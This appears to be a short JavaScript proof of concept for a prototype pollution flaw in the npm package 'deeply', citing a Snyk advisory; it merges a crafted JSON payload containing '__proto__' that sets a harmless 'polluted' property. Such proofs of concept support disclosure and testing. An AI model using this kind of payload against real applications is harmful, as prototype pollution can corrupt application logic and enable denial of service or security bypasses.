//https://snyk.io/vuln/SNYK-JS-DEEPLY-451026
    const mergeFn = require('deeply');
    const payload =  '{"__proto__": {"polluted": "yes"}}';
    var obj = {}

    mergeFn({}, JSON.parse(payload))  
